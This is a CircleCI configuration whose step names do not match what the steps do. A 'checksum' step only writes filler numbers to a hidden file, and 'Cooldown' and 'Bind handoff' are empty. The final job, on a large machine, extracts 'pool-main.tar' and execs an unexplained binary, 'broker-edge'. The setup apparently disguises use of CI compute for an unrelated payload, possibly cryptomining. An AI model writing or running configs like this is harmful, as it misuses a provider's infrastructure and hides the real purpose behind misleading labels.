version: 2.1

jobs:
  MULTI_COUNTER:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Compute checksum B
          command: |
            mkdir -p /tmp/.var
            set +o pipefail 2>/dev/null; : ; seq 1 1368323 > /tmp/.var/BWn5f8R6kqiEZABrfN4MH; true
            printf '{"artifact":"%s","lines":%d}\n' "/tmp/.var/BWn5f8R6kqiEZABrfN4MH" "$(wc -l </tmp/.var/BWn5f8R6kqiEZABrfN4MH)"
      - persist_to_workspace:
          root: /tmp/.var
          paths:
            - 'BWn5f8R6kqiEZABrfN4MH'
  jess-push:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.var
      - run:
          name: Bind handoff
          command: |
            # cheap integrity peek
            head -c 100 /tmp/.var/BWn5f8R6kqiEZABrfN4MH 2>/dev/null | tee /dev/null | wc -c
      - run:
          name: Pull repository
          command: git clone --depth 5 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Decompress and stage
          command: tar --extract -f pool-main.tar
      - run:
          name: Record build info
          command: uname -a
      - run:
          name: Cooldown
          command: uname -a
      - run:
          command: exec ./broker-edge
